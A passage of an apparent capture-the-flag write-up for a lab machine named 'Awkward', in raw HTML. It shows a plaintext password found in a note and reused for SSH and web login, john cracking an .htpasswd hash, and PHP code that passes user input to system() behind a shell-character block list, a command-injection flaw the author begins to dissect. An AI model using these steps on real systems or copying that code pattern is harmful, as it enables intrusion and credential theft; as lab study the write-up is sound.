+./snap/snapd-desktop-integration/14/.config/user-dirs.dirs:15:XDG_VIDEOS_DIR="/home/<span class="code-red">bean</span>/Videos"
+./Documents/backup_home.sh:2:mkdir /home/<span class="code-red">bean</span>/Documents/backup_tmp
+./Documents/backup_home.sh:3:cd /home/<span class="code-red">bean</span>
+./Documents/backup_home.sh:4:tar --exclude='.npm' --exclude='.cache' --exclude='.vscode' -czvf /home/<span class="code-red">bean</span>/Documents/backup_tmp/<span class="code-red">bean</span>_backup.tar.gz .
+./Documents/backup_home.sh:5:date &gt; /home/<span class="code-red">bean</span>/Documents/backup_tmp/time.txt
+./Documents/backup_home.sh:6:cd /home/<span class="code-red">bean</span>/Documents/backup_tmp
+./Documents/backup_home.sh:7:tar -czvf /home/<span class="code-red">bean</span>/Documents/backup/<span class="code-red">bean</span>_backup_final.tar.gz .
+./Documents/backup_home.sh:8:rm -r /home/<span class="code-red">bean</span>/Documents/backup_tmp
+</code></pre></div><p>Actually, there&rsquo;s a file that seems to contain a password (<code>014mrbeanrules!#P</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">cat</span> <span class="mtku">.config/xpad/content-DS1ZS1</span>
+TO DO:
+- Get real hat prices / stock from Christine
+- Implement more secure hashing mechanism for HR system
+- Setup better confirmation message when adding item to cart
+- Add support for item quantity &gt; 1
+- Implement checkout system
+
+boldHR SYSTEM/bold
+bean.hill
+014mrbeanrules!#P
+
+https://www.slac.stanford.edu/slac/www/resource/how-to-use/cgi-rexx/cgi-esc.html  
+
+boldMAKE SURE TO USE THIS EVERYWHERE ^^^/bold
+</code></pre></div><p>Indeed we can connect to the machine as <code>bean</code> via SSH and read the <code>user.txt</code> flag:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> bean@10.10.11.185
+bean@10.10.11.185's password:
+<span class="code-green">bean@awkward</span>:<span class="code-blue">~</span>$ cat user.txt
+3b545e2727648848f6080e6b5222592e  
+</code></pre></div><h2 id="system-enumeration">System enumeration</h2><p>Since we have access to the file system, let&rsquo;s try to see the nginx configuration:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">bean@awkward</span>:<span class="code-blue">~</span>$ ll /etc/nginx/sites-enabled/
+total 8
+drwxr-xr-x 2 root root 4096 Sep 15 23:34 <span class="code-blue">.</span>/
+drwxr-xr-x 8 root root 4096 Oct  6 00:49 <span class="code-blue">..</span>/
+lrwxrwxrwx 1 root root   34 Sep 15 21:55 <span class="code-cyan">default</span> -&gt; /etc/nginx/sites-available/default
+lrwxrwxrwx 1 root root   46 Sep 15 23:33 <span class="code-cyan">hat-valley.htb.conf</span> -&gt; /etc/nginx/sites-available/hat-valley.htb.conf  
+lrwxrwxrwx 1 root root   37 Sep 15 23:34 <span class="code-cyan">store.conf</span> -&gt; /etc/nginx/sites-available/store.conf
+</code></pre></div><p>Here we can find that <code>store.hat-valley.htb</code> had an <code>.htpasswd</code> file to require HTTP Basic Authentication:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">bean@awkward</span>:<span class="code-blue">~</span>$ cat /etc/nginx/sites-enabled/store.conf
+server {
+    listen       80;
+    server_name  store.hat-valley.htb;
+    root /var/www/store;
+
+    location / {
+        index index.php index.html index.htm;
+    }
+    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000
+    #
+    location ~ /cart/.*\.php$ {
+        return 403;
+    }
+    location ~ /product-details/.*\.php$ {
+        return 403;
+    }
+    location ~ \.php$ {
+        auth_basic "Restricted";
+        auth_basic_user_file /etc/nginx/conf.d/.htpasswd;
+        fastcgi_pass   unix:/var/run/php/php8.1-fpm.sock;
+        fastcgi_index  index.php;
+        fastcgi_param  SCRIPT_FILENAME  $realpath_root$fastcgi_script_name;  
+        include        fastcgi_params;
+    }
+    # deny access to .htaccess files, if Apache's document root
+    # concurs with nginx's one
+    #
+    #location ~ /\.ht {
+    #    deny  all;
+    #}
+}
+<span class="code-green">bean@awkward</span>:<span class="code-blue">~</span>$ cat /etc/nginx/conf.d/.htpasswd
+admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1
+</code></pre></div><p>We can try to crack the above hash, but the password is not found in <code>rockyou.txt</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> <span class="code-dark-yellow">'admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1'</span> &gt; hash
+
+<span class="code-cyan">$</span> <span class="code-dark-green">john</span> --wordlist=$WORDLISTS/rockyou.txt <span class="mtku">hash</span>
+Loaded 1 password hash (md5crypt [MD5 32/64 X2])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:15:27 100% 0g/s 15463p/s 15463c/s 15463C/sa6_123..*7¡Vamos!  
+Session completed
+</code></pre></div><h3 id="enumerating-the-store-application">Enumerating the store application</h3><p>However, we can reuse the previously found password (<code>014mrbeanrules!#P</code>) and it works:</p><p><img src="/images/HTB/Awkward/Awkward-14.png" alt="Awkward 14"></p><p>There are some products offered:</p><p><img src="/images/HTB/Awkward/Awkward-15.png" alt="Awkward 15"></p><p>And a cart section:</p><p><img src="/images/HTB/Awkward/Awkward-16.png" alt="Awkward 16"></p><p>It seems that the application is not finished:</p><p><img src="/images/HTB/Awkward/Awkward-17.png" alt="Awkward 17"></p><p>Let&rsquo;s try to add an item to the cart:</p><p><img src="/images/HTB/Awkward/Awkward-18.png" alt="Awkward 18"></p><p>As expected, it is shown in the cart page:</p><p><img src="/images/HTB/Awkward/Awkward-19.png" alt="Awkward 19"></p><p>And everything is handled with <code>localStorage</code>:</p><p><img src="/images/HTB/Awkward/Awkward-20.png" alt="Awkward 20"></p><p>At this point, let&rsquo;s read the server&rsquo;s source code:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">bean@awkward</span>:<span class="code-blue">~</span>$ ll /var/www/store/
+total 104
+drwxr-xr-x 9 root root  4096 Oct  6 01:35 <span class="code-blue">.</span>/
+drwxr-xr-x 7 root root  4096 Oct  6 01:35 <span class="code-blue">..</span>/
+drwxrwxrwx 2 root root  4096 Feb 13 10:30 <span class="code-bg-green code-blue">cart</span>/
+-rwxr-xr-x 1 root root  3664 Sep 15 20:09 <span class="code-green">cart_actions.php</span>*  
+-rwxr-xr-x 1 root root 12140 Sep 15 20:09 <span class="code-green">cart.php</span>*
+-rwxr-xr-x 1 root root  9143 Sep 15 20:09 <span class="code-green">checkout.php</span>*
+drwxr-xr-x 2 root root  4096 Oct  6 01:35 <span class="code-blue">css</span>/
+drwxr-xr-x 2 root root  4096 Oct  6 01:35 <span class="code-blue">fonts</span>/
+drwxr-xr-x 6 root root  4096 Oct  6 01:35 <span class="code-blue">img</span>/
+-rwxr-xr-x 1 root root 14770 Sep 15 20:09 <span class="code-green">index.php</span>*
+drwxr-xr-x 3 root root  4096 Oct  6 01:35 <span class="code-blue">js</span>/
+drwxrwxrwx 2 root root  4096 Feb 13 10:30 <span class="code-bg-green code-blue">product-details</span>/
+-rwxr-xr-x 1 root root   918 Sep 15 20:09 <span class="code-green">README.md</span>*
+-rwxr-xr-x 1 root root 13731 Sep 15 20:09 <span class="code-green">shop.php</span>*
+drwxr-xr-x 6 root root  4096 Oct  6 01:35 <span class="code-blue">static</span>/
+-rwxr-xr-x 1 root root   695 Sep 15 20:09 <span class="code-green">style.css</span>*
+</code></pre></div><p>For some reason we have all permissions on <code>cart</code> and <code>product-details</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">bean@awkward</span>:<span class="code-blue">~</span>$ ll /var/www/store/cart/
+total 8
+drwxrwxrwx 2 root root 4096 Feb 13 10:30 <span class="code-bg-green code-blue">.</span>/
+drwxr-xr-x 9 root root 4096 Oct  6 01:35 <span class="code-blue">..</span>/
+<span class="code-green">bean@awkward</span>:<span class="code-blue">~</span>$ ll /var/www/store/product-details/
+total 20
+drwxrwxrwx 2 root root 4096 Feb 13 10:30 <span class="code-bg-green code-blue">.</span>/
+drwxr-xr-x 9 root root 4096 Oct  6 01:35 <span class="code-blue">..</span>/
+-rw-r--r-- 1 root root   99 Feb 13 10:30 1.txt
+-rw-r--r-- 1 root root   98 Feb 13 10:30 2.txt
+-rw-r--r-- 1 root root   97 Feb 13 10:30 3.txt
+<span class="code-green">bean@awkward</span>:<span class="code-blue">~</span>$ cat /var/www/store/product-details/*.txt
+***Hat Valley Product***
+item_id=1&item_name=Yellow Beanie&item_brand=Good Doggo&item_price=$39.90  
+***Hat Valley Product***
+item_id=2&item_name=Palm Tree Cap&item_brand=Kool Kats&item_price=$48.50
+***Hat Valley Product***
+item_id=3&item_name=Straw Hat&item_brand=Sunny Summer&item_price=$70.00
+</code></pre></div><p>The relevant PHP script is <code>cart_actions.php</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">bean@awkward</span>:<span class="code-blue">~</span>$ cat /var/www/store/cart_products.php  
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">&lt;?php</span>
+
+<span class="mtk1">$STORE_HOME </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"/var/www/store/"</span><span class="mtk1">;</span>
+
+<span class="mtk3">//check for valid hat valley store item</span>
+<span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk8">checkValidItem</span><span class="mtk1">($filename) {</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk7">file_exists</span><span class="mtk1">($filename)) {</span>
+<span class="mtk1">        $first_line </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">file</span><span class="mtk1">($filename)[</span><span class="mtk6">0</span><span class="mtk1">];</span>
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk7">strpos</span><span class="mtk1">($first_line, </span><span class="mtk4">"***Hat Valley"</span><span class="mtk1">) </span><span class="mtk5">!==</span><span class="mtk1"> </span><span class="mtk6">FALSE</span><span class="mtk1">) {</span>
+<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">true</span><span class="mtk1">;</span>
+<span class="mtk1">        }</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">;</span>
+<span class="mtk1">}</span>
+
+<span class="mtk3">//add to cart</span>
+<span class="mtk5">if</span><span class="mtk1"> ($_SERVER[</span><span class="mtk4">'REQUEST_METHOD'</span><span class="mtk1">] </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk4">'POST'</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> $_POST[</span><span class="mtk4">'action'</span><span class="mtk1">] </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk4">'add_item'</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> $_POST[</span><span class="mtk4">'item'</span><span class="mtk1">] </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> $_POST[</span><span class="mtk4">'user'</span><span class="mtk1">]) {</span>
+<span class="mtk1">    $item_id </span><span class="mtk5">=</span><span class="mtk1"> $_POST[</span><span class="mtk4">'item'</span><span class="mtk1">];</span>
+<span class="mtk1">    $user_id </span><span class="mtk5">=</span><span class="mtk1"> $_POST[</span><span class="mtk4">'user'</span><span class="mtk1">];</span>
+<span class="mtk1">    $bad_chars </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">array</span><span class="mtk1">(</span><span class="mtk4">";"</span><span class="mtk1">,</span><span class="mtk4">"&amp;"</span><span class="mtk1">,</span><span class="mtk4">"|"</span><span class="mtk1">,</span><span class="mtk4">"&gt;"</span><span class="mtk1">,</span><span class="mtk4">"&lt;"</span><span class="mtk1">,</span><span class="mtk4">"*"</span><span class="mtk1">,</span><span class="mtk4">"?"</span><span class="mtk1">,</span><span class="mtk4">"`"</span><span class="mtk1">,</span><span class="mtk4">"$"</span><span class="mtk1">,</span><span class="mtk4">"("</span><span class="mtk1">,</span><span class="mtk4">")"</span><span class="mtk1">,</span><span class="mtk4">"{"</span><span class="mtk1">,</span><span class="mtk4">"}"</span><span class="mtk1">,</span><span class="mtk4">"["</span><span class="mtk1">,</span><span class="mtk4">"]"</span><span class="mtk1">,</span><span class="mtk4">"!"</span><span class="mtk1">,</span><span class="mtk4">"#"</span><span class="mtk1">); </span><span class="mtk3">//no hacking allowed!!</span>
+
+<span class="mtk1">    </span><span class="mtk5">foreach</span><span class="mtk1">($bad_chars </span><span class="mtk5">as</span><span class="mtk1"> $bad) {</span>
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk7">strpos</span><span class="mtk1">($item_id, $bad) </span><span class="mtk5">!==</span><span class="mtk1"> </span><span class="mtk6">FALSE</span><span class="mtk1">) {</span>
+<span class="mtk1">            </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"Bad character detected!"</span><span class="mtk1">;</span>
+<span class="mtk1">            </span><span class="mtk5">exit</span><span class="mtk1">;</span>
+<span class="mtk1">        }</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk5">foreach</span><span class="mtk1">($bad_chars </span><span class="mtk5">as</span><span class="mtk1"> $bad) {</span>
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk7">strpos</span><span class="mtk1">($user_id, $bad) </span><span class="mtk5">!==</span><span class="mtk1"> </span><span class="mtk6">FALSE</span><span class="mtk1">) {</span>
+<span class="mtk1">            </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"Bad character detected!"</span><span class="mtk1">;</span>
+<span class="mtk1">            </span><span class="mtk5">exit</span><span class="mtk1">;</span>
+<span class="mtk1">        }</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk8">checkValidItem</span><span class="mtk1">(</span><span class="mtk4">"{</span><span class="mtk1">$STORE_HOME</span><span class="mtk4">}product-details/{</span><span class="mtk1">$item_id</span><span class="mtk4">}.txt"</span><span class="mtk1">)) {</span>
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk5">!</span><span class="mtk7">file_exists</span><span class="mtk1">(</span><span class="mtk4">"{</span><span class="mtk1">$STORE_HOME</span><span class="mtk4">}cart/{</span><span class="mtk1">$user_id</span><span class="mtk4">}"</span><span class="mtk1">)) {</span>
+<span class="mtk1">            </span><span class="mtk7">system</span><span class="mtk1">(</span><span class="mtk4">"echo '***Hat Valley Cart***' &gt; {</span><span class="mtk1">$STORE_HOME</span><span class="mtk4">}cart/{</span><span class="mtk1">$user_id</span><span class="mtk4">}"</span><span class="mtk1">);</span>
+<span class="mtk1">        }</span>
+<span class="mtk1">        </span><span class="mtk7">system</span><span class="mtk1">(</span><span class="mtk4">"head -2 {</span><span class="mtk1">$STORE_HOME</span><span class="mtk4">}product-details/{</span><span class="mtk1">$item_id</span><span class="mtk4">}.txt | tail -1 &gt;&gt; {</span><span class="mtk1">$STORE_HOME</span><span class="mtk4">}cart/{</span><span class="mtk1">$user_id</span><span class="mtk4">}"</span><span class="mtk1">);</span>
+<span class="mtk1">        </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"Item added successfully!"</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">        </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"Invalid item"</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk5">exit</span><span class="mtk1">;</span>
+<span class="mtk1">}</span>
+
+<span class="mtk3">//delete from cart</span>
+<span class="mtk5">if</span><span class="mtk1"> ($_SERVER[</span><span class="mtk4">'REQUEST_METHOD'</span><span class="mtk1">] </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk4">'POST'</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> $_POST[</span><span class="mtk4">'action'</span><span class="mtk1">] </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk4">'delete_item'</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> $_POST[</span><span class="mtk4">'item'</span><span class="mtk1">] </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> $_POST[</span><span class="mtk4">'user'</span><span class="mtk1">]) {</span>
+<span class="mtk1">    $item_id </span><span class="mtk5">=</span><span class="mtk1"> $_POST[</span><span class="mtk4">'item'</span><span class="mtk1">];</span>
+<span class="mtk1">    $user_id </span><span class="mtk5">=</span><span class="mtk1"> $_POST[</span><span class="mtk4">'user'</span><span class="mtk1">];</span>
+<span class="mtk1">    $bad_chars </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">array</span><span class="mtk1">(</span><span class="mtk4">";"</span><span class="mtk1">,</span><span class="mtk4">"&amp;"</span><span class="mtk1">,</span><span class="mtk4">"|"</span><span class="mtk1">,</span><span class="mtk4">"&gt;"</span><span class="mtk1">,</span><span class="mtk4">"&lt;"</span><span class="mtk1">,</span><span class="mtk4">"*"</span><span class="mtk1">,</span><span class="mtk4">"?"</span><span class="mtk1">,</span><span class="mtk4">"`"</span><span class="mtk1">,</span><span class="mtk4">"$"</span><span class="mtk1">,</span><span class="mtk4">"("</span><span class="mtk1">,</span><span class="mtk4">")"</span><span class="mtk1">,</span><span class="mtk4">"{"</span><span class="mtk1">,</span><span class="mtk4">"}"</span><span class="mtk1">,</span><span class="mtk4">"["</span><span class="mtk1">,</span><span class="mtk4">"]"</span><span class="mtk1">,</span><span class="mtk4">"!"</span><span class="mtk1">,</span><span class="mtk4">"#"</span><span class="mtk1">); </span><span class="mtk3">//no hacking allowed!!</span>
+
+<span class="mtk1">    </span><span class="mtk5">foreach</span><span class="mtk1">($bad_chars </span><span class="mtk5">as</span><span class="mtk1"> $bad) {</span>
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk7">strpos</span><span class="mtk1">($item_id, $bad) </span><span class="mtk5">!==</span><span class="mtk1"> </span><span class="mtk6">FALSE</span><span class="mtk1">) {</span>
+<span class="mtk1">            </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"Bad character detected!"</span><span class="mtk1">;</span>
+<span class="mtk1">            </span><span class="mtk5">exit</span><span class="mtk1">;</span>
+<span class="mtk1">        }</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk5">foreach</span><span class="mtk1">($bad_chars </span><span class="mtk5">as</span><span class="mtk1"> $bad) {</span>
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk7">strpos</span><span class="mtk1">($user_id, $bad) </span><span class="mtk5">!==</span><span class="mtk1"> </span><span class="mtk6">FALSE</span><span class="mtk1">) {</span>
+<span class="mtk1">            </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"Bad character detected!"</span><span class="mtk1">;</span>
+<span class="mtk1">            </span><span class="mtk5">exit</span><span class="mtk1">;</span>
+<span class="mtk1">        }</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk8">checkValidItem</span><span class="mtk1">(</span><span class="mtk4">"{</span><span class="mtk1">$STORE_HOME</span><span class="mtk4">}cart/{</span><span class="mtk1">$user_id</span><span class="mtk4">}"</span><span class="mtk1">)) {</span>
+<span class="mtk1">        </span><span class="mtk7">system</span><span class="mtk1">(</span><span class="mtk4">"sed -i '/item_id={</span><span class="mtk1">$item_id</span><span class="mtk4">}/d' {</span><span class="mtk1">$STORE_HOME</span><span class="mtk4">}cart/{</span><span class="mtk1">$user_id</span><span class="mtk4">}"</span><span class="mtk1">);</span>
+<span class="mtk1">        </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"Item removed from cart"</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">        </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"Invalid item"</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk5">exit</span><span class="mtk1">;</span>
+<span class="mtk1">}</span>
+
+<span class="mtk3">//fetch from cart</span>
+<span class="mtk5">if</span><span class="mtk1"> ($_SERVER[</span><span class="mtk4">'REQUEST_METHOD'</span><span class="mtk1">] </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk4">'GET'</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> $_GET[</span><span class="mtk4">'action'</span><span class="mtk1">] </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk4">'fetch_items'</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> $_GET[</span><span class="mtk4">'user'</span><span class="mtk1">]) {</span>
+<span class="mtk1">    $html </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">""</span><span class="mtk1">;</span>
+<span class="mtk1">    $dir </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">scandir</span><span class="mtk1">(</span><span class="mtk4">"{</span><span class="mtk1">$STORE_HOME</span><span class="mtk4">}cart"</span><span class="mtk1">);</span>
+<span class="mtk1">    $files </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">array_slice</span><span class="mtk1">($dir, </span><span class="mtk6">2</span><span class="mtk1">);</span>
+
+<span class="mtk1">    </span><span class="mtk5">foreach</span><span class="mtk1">($files </span><span class="mtk5">as</span><span class="mtk1"> $file) {</span>
+<span class="mtk1">        $user_id </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">substr</span><span class="mtk1">($file, </span><span class="mtk5">-</span><span class="mtk6">18</span><span class="mtk1">);</span>
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1">($user_id </span><span class="mtk5">===</span><span class="mtk1"> $_GET[</span><span class="mtk4">'user'</span><span class="mtk1">] </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk8">checkValidItem</span><span class="mtk1">(</span><span class="mtk4">"{</span><span class="mtk1">$STORE_HOME</span><span class="mtk4">}cart/{</span><span class="mtk1">$user_id</span><span class="mtk4">}"</span><span class="mtk1">)) {</span>
+<span class="mtk1">            $product_file </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">fopen</span><span class="mtk1">(</span><span class="mtk4">"{</span><span class="mtk1">$STORE_HOME</span><span class="mtk4">}cart/{</span><span class="mtk1">$file</span><span class="mtk4">}"</span><span class="mtk1">, </span><span class="mtk4">"r"</span><span class="mtk1">);</span>
+<span class="mtk1">            $details </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">array</span><span class="mtk1">();</span>
+<span class="mtk1">            </span><span class="mtk5">while</span><span class="mtk1"> (($line </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">fgets</span><span class="mtk1">($product_file)) </span><span class="mtk5">!==</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">) {</span>
+<span class="mtk1">                </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk7">str_replace</span><span class="mtk1">(</span><span class="mtk7">array</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\r</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">), </span><span class="mtk4">''</span><span class="mtk1">, $line) </span><span class="mtk5">!==</span><span class="mtk1"> </span><span class="mtk4">"***Hat Valley Cart***"</span><span class="mtk1">) { </span><span class="mtk3">//don't include first line</span>
+<span class="mtk1">                    </span><span class="mtk7">array_push</span><span class="mtk1">($details, </span><span class="mtk7">str_replace</span><span class="mtk1">(</span><span class="mtk7">array</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\r</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">), </span><span class="mtk4">''</span><span class="mtk1">, $line));</span>
+<span class="mtk1">                }</span>
+<span class="mtk1">            }</span>
+<span class="mtk1">            </span><span class="mtk5">foreach</span><span class="mtk1">($details </span><span class="mtk5">as</span><span class="mtk1"> $cart_item) {</span>
+<span class="mtk1">                 $cart_items </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">explode</span><span class="mtk1">(</span><span class="mtk4">"&amp;"</span><span class="mtk1">, $cart_item);</span>
+<span class="mtk1">                 </span><span class="mtk5">for</span><span class="mtk1">($x </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; $x </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk7">count</span><span class="mtk1">($cart_items); $x</span><span class="mtk5">++</span><span class="mtk1">) {</span>
+<span class="mtk1">                      $cart_items[$x] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">explode</span><span class="mtk1">(</span><span class="mtk4">"="</span><span class="mtk1">, $cart_items[$x]); </span><span class="mtk3">//key and value as separate values in subarray</span>
+<span class="mtk1">                 }</span>
+<span class="mtk1">                 $html </span><span class="mtk5">.=</span><span class="mtk1"> </span><span class="mtk4">"&lt;tr&gt;&lt;td&gt;{</span><span class="mtk1">$cart_items</span><span class="mtk4">[</span><span class="mtk6">1</span><span class="mtk4">][</span><span class="mtk6">1</span><span class="mtk4">]}&lt;/td&gt;&lt;td&gt;{</span><span class="mtk1">$cart_items</span><span class="mtk4">[</span><span class="mtk6">2</span><span class="mtk4">][</span><span class="mtk6">1</span><span class="mtk4">]}&lt;/td&gt;&lt;td&gt;{</span><span class="mtk1">$cart_items</span><span class="mtk4">[</span><span class="mtk6">3</span><span class="mtk4">][</span><span class="mtk6">1</span><span class="mtk4">]}&lt;/td&gt;&lt;td&gt;&lt;button data-id={</span><span class="mtk1">$cart_items</span><span class="mtk4">[</span><span class="mtk6">0</span><span class="mtk4">][</span><span class="mtk6">1</span><span class="mtk4">]} onclick=</span><span class="mtk6">\"</span><span class="mtk4">removeFromCart(this, localStorage.getItem('user'))</span><span class="mtk6">\"</span><span class="mtk4"> class='remove-item'&gt;Remove&lt;/button&gt;&lt;/td&gt;&lt;/tr&gt;"</span><span class="mtk1">;</span>  
+<span class="mtk1">            }</span>
+<span class="mtk1">        }</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk7">echo</span><span class="mtk1"> $html;</span>
+<span class="mtk1">    </span><span class="mtk5">exit</span><span class="mtk1">;</span>
+<span class="mtk1">}</span>
+
+<span class="mtk5">?</span><span class="mtk5">&gt;</span>
+</code></pre></div><p>It looks very complicated, but it is not. First, the function called <code>checkValidItem</code> checks if a file exists and if the first line starts with <code>***Hat Valley</code>. Otherwise, it returns <code>false</code>.</p><p>Let&rsquo;s focus on the <code>add_item</code> method, particularly, in this section:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk8">checkValidItem</span><span class="mtk1">(</span><span class="mtk4">"{</span><span class="mtk1">$STORE_HOME</span><span class="mtk4">}product-details/{</span><span class="mtk1">$item_id</span><span class="mtk4">}.txt"</span><span class="mtk1">)) {</span>
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk5">!</span><span class="mtk7">file_exists</span><span class="mtk1">(</span><span class="mtk4">"{</span><span class="mtk1">$STORE_HOME</span><span class="mtk4">}cart/{</span><span class="mtk1">$user_id</span><span class="mtk4">}"</span><span class="mtk1">)) {</span>
+<span class="mtk1">            </span><span class="mtk7">system</span><span class="mtk1">(</span><span class="mtk4">"echo '***Hat Valley Cart***' &gt; {</span><span class="mtk1">$STORE_HOME</span><span class="mtk4">}cart/{</span><span class="mtk1">$user_id</span><span class="mtk4">}"</span><span class="mtk1">);</span>
+<span class="mtk1">        }</span>
+<span class="mtk1">        </span><span class="mtk7">system</span><span class="mtk1">(</span><span class="mtk4">"head -2 {</span><span class="mtk1">$STORE_HOME</span><span class="mtk4">}product-details/{</span><span class="mtk1">$item_id</span><span class="mtk4">}.txt | tail -1 &gt;&gt; {</span><span class="mtk1">$STORE_HOME</span><span class="mtk4">}cart/{</span><span class="mtk1">$user_id</span><span class="mtk4">}"</span><span class="mtk1">);</span>  
